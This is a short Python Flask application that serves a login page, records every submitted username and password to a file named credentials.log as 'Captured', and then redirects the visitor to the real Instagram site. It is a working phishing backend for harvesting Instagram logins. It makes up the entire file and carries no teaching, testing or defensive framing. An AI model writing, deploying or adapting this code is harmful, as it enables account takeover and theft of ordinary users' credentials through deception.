from flask import Flask, request, render_template, redirect
import logging
import os

app = Flask(__name__)
os.makedirs('logs', exist_ok=True)
logging.basicConfig(filename='logs/credentials.log', level=logging.INFO)

@app.route('/', methods=['GET'])
def index():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    logging.info(f"Captured: {username} | {password}")
    return redirect("https://instagram.com")  # Send user to real site

if __name__ == '__main__':
    app.run(debug=True, port=5000)
